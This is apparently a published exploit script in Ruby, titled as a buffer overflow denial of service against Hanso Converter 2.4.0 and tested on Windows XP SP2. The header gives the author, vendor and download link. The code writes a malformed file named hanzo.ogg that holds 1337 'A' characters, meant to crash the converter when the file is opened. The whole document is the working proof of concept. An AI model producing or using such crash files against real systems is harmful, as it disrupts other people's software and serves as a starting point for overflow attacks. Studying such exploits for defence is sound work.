#!/usr/bin/env ruby
# coding:UTF-8
# Exploit Title:Hanso Converter 2.4.0 Buffer Overflow(DoS)
# Author:Necmettin COSKUN => twitter.com/babayarisi
# Vendor :www.hansotools.com
# Software link:http://www.hansotools.com/downloads/hanso-converter-setup.exe
# version: 2.4.0
# Tested on: windows XP sp2
 
DENEME = "A" * 1337
 
File.open('hanzo.ogg', 'w') do |bofdosya| 
bofdosya.puts (DENEME)
bofdosya.close()
end
